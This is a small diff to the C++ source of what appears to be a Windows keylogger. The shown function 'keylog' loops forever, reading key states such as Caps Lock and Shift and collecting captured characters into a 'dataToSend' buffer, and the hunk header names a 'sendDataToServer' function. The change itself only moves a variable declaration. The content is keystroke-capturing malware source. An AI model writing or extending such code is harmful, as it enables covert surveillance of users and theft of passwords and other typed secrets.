@@ -133,9 +133,9 @@ void sendDataToServer(const std::string& data)
 void keylog(const std::vector<char>& printableChars)
 {
     const auto& keyMap = KeyboardSymbols::getVKchar(); 
+    bool isCapsLock, isShiftPressed, useUpperCase; 
     bool keyState[256] = { false };
     std::string dataToSend;
-    bool isCapsLock, isShiftPressed, useUpperCase;
 
     while (true) {
         isCapsLock = (GetKeyState(VK_CAPITAL) & CAPS_LOCK_ON) != 0;
